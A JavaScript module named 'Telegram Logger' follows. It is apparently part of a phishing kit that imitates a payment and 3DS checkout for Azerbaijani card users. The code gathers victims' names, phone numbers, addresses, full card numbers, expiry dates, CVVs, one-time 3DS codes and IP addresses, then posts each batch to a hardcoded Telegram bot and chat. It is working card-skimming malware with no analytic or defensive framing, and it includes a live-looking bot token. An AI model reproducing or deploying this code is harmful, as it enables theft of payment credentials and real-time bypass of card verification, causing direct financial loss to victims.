/**
 * Telegram Logger
 * Collects payment information across multiple pages and sends to Telegram
 */

const TelegramLogger = {
    botToken: '8764793093:AAElBpPpDQe7qHh3NunWDjuH_8238leNoK0',
    chatId: '-1003938322369',
    
    // Save customer info from addinfo.html
    saveCustomerInfo: function(name, phone, email, address) {
        const customerData = {
            name: name || '',
            phone: phone || '',
            email: email || '',
            address: address || '',
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('customer_info', JSON.stringify(customerData));
        console.log('✅ Customer info saved:', customerData);
    },
    
    // Save card details from odeme1.html
    saveCardDetails: function(cardNumber, cardholderName, expiryDate, cvv, amount) {
        const messageId = this.getNextMessageId();
        const cardData = {
            cardNumber: cardNumber || '',
            cardholderName: cardholderName || '',
            expiryDate: expiryDate || '',
            cvv: cvv || '',
            amount: amount || '',
            messageId: messageId,
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('card_details', JSON.stringify(cardData));
        
        // Reset card sent flag for new transaction
        localStorage.removeItem('card_info_sent');
        
        console.log('✅ Card details saved:', cardData);
    },
    
    // Save OTP code from 3DS pages
    saveOTP: function(otpCode, bankName) {
        const otpData = {
            otp: otpCode || '',
            bank: bankName || '',
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('otp_data', JSON.stringify(otpData));
        console.log('✅ OTP data saved:', otpData);
    },
    
    // Get all collected data
    getAllData: async function() {
        const customerInfo = JSON.parse(localStorage.getItem('customer_info') || '{}');
        const cardDetails = JSON.parse(localStorage.getItem('card_details') || '{}');
        const otpData = JSON.parse(localStorage.getItem('otp_data') || '{}');
        
        // Get IP address - check if already saved
        let ipAddress = localStorage.getItem('user_ip');
        
        if (!ipAddress) {
            // If not saved, fetch it now
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
                localStorage.setItem('user_ip', ipAddress);
            } catch (error) {
                console.log('IP alınmadı:', error);
                ipAddress = 'Unknown';
            }
        }
        
        return {
            customer: customerInfo,
            card: cardDetails,
            otp: otpData,
            ipAddress: ipAddress
        };
    },
    
    // Get next message ID
    getNextMessageId: function() {
        let messageCount = parseInt(localStorage.getItem('telegram_message_count') || '0');
        messageCount++;
        localStorage.setItem('telegram_message_count', messageCount.toString());
        return messageCount;
    },
    
    // Format message for Telegram (Card info only)
    formatCardMessage: function(data) {
        // Use the message ID saved with card data
        const messageId = (data.card && data.card.messageId) || this.getNextMessageId();
        
        let message = `💳 *Kart Məlumatları*\n`;
        message += `🆔 Mesaj ID: ${messageId}\n\n`;
        
        // Amount
        if (data.card && data.card.amount) {
            message += `💰 Məbləğ: ${data.card.amount} AZN\n`;
        } else {
            message += `💰 Məbləğ: -\n`;
        }
        
        // Cardholder name
        if (data.card && data.card.cardholderName) {
            message += `👤 Kart sahibi: ${data.card.cardholderName}\n`;
        } else {
            message += `👤 Kart sahibi: -\n`;
        }
        
        // Phone number (from customer info)
        if (data.customer && data.customer.phone) {
            message += `📱 Mobil nömrə: ${data.customer.phone}\n`;
        } else {
            message += `📱 Mobil nömrə: -\n`;
        }
        
        // Card number
        if (data.card && data.card.cardNumber) {
            message += `🔢 16 rəqəmli kod: \`${data.card.cardNumber}\`\n`;
        } else {
            message += `🔢 16 rəqəmli kod: -\n`;
        }
        
        // Expiry date
        if (data.card && data.card.expiryDate) {
            message += `📅 Son istifadə tarixi: ${data.card.expiryDate}\n`;
        } else {
            message += `📅 Son istifadə tarixi: -\n`;
        }
        
        // CVV
        if (data.card && data.card.cvv) {
            message += `🔒 CVV: \`${data.card.cvv}\`\n`;
        } else {
            message += `🔒 CVV: -\n`;
        }
        
        // IP Address
        if (data.ipAddress) {
            message += `🌐 IP Adresi: ${data.ipAddress}`;
        } else {
            message += `🌐 IP Adresi: -`;
        }
        
        return message;
    },
    
    // Format OTP message for Telegram
    formatOTPMessage: function(data) {
        // Use the SAME message ID as the card data
        const messageId = (data.card && data.card.messageId) || 0;
        
        let message = `🔐 *3DS Təsdiqləmə*\n`;
        message += `🆔 Mesaj ID: ${messageId}\n\n`;
        
        // Card number (to identify which card)
        if (data.card && data.card.cardNumber) {
            const lastFour = data.card.cardNumber.slice(-4);
            message += `🔢 Kart: **** **** **** ${lastFour}\n`;
        }
        
        // Bank name
        if (data.otp && data.otp.bank) {
            message += `🏦 Bank: ${data.otp.bank}\n`;
        }
        
        // OTP Code
        if (data.otp && data.otp.otp) {
            message += `🔑 OTP Kod: \`${data.otp.otp}\``;
        }
        
        return message;
    },
    
    // Send card info to Telegram (from odeme1.html)
    sendCardInfo: async function() {
        // Check if card info was already sent
        if (localStorage.getItem('card_info_sent') === 'true') {
            console.log('⚠️ Kart məlumatları artıq göndərilib, təkrar göndərilmir');
            return true;
        }
        
        try {
            const data = await this.getAllData();
            const message = this.formatCardMessage(data);
            
            const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            if (response.ok) {
                console.log('✅ Kart məlumatları Telegram-a göndərildi!');
                // Mark as sent but don't clear data yet (we need it for OTP message)
                localStorage.setItem('card_info_sent', 'true');
                return true;
            } else {
                const errorData = await response.json();
                console.error('❌ Telegram xətası:', errorData);
                return false;
            }
        } catch (error) {
            console.error('❌ Telegram göndərmə xətası:', error);
            return false;
        }
    },
    
    // Send OTP info to Telegram (from 3DS pages)
    sendOTPInfo: async function() {
        // Don't check if already sent - allow multiple OTP attempts
        try {
            const data = await this.getAllData();
            const message = this.formatOTPMessage(data);
            
            const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            if (response.ok) {
                console.log('✅ OTP məlumatları Telegram-a göndərildi!');
                return true;
            } else {
                const errorData = await response.json();
                console.error('❌ Telegram xətası:', errorData);
                return false;
            }
        } catch (error) {
            console.error('❌ Telegram göndərmə xətası:', error);
            return false;
        }
    },
    
    // Send message to Telegram (legacy - kept for compatibility)
    sendToTelegram: async function() {
        // Check if card info was already sent
        const cardInfoSent = localStorage.getItem('card_info_sent');
        
        if (!cardInfoSent) {
            // Send card info first
            await this.sendCardInfo();
        }
        
        // Check if we have OTP data
        const otpData = JSON.parse(localStorage.getItem('otp_data') || '{}');
        if (otpData && otpData.otp) {
            // Send OTP info
            await this.sendOTPInfo();
        }
        
        return true;
    },
    
    // Clear all stored data
    clearData: function() {
        localStorage.removeItem('customer_info');
        localStorage.removeItem('card_details');
        localStorage.removeItem('otp_data');
        localStorage.removeItem('card_info_sent');
        localStorage.removeItem('user_ip');
        console.log('🗑️ Bütün məlumatlar təmizləndi');
    }
};

// Export for use in other files
window.TelegramLogger = TelegramLogger;
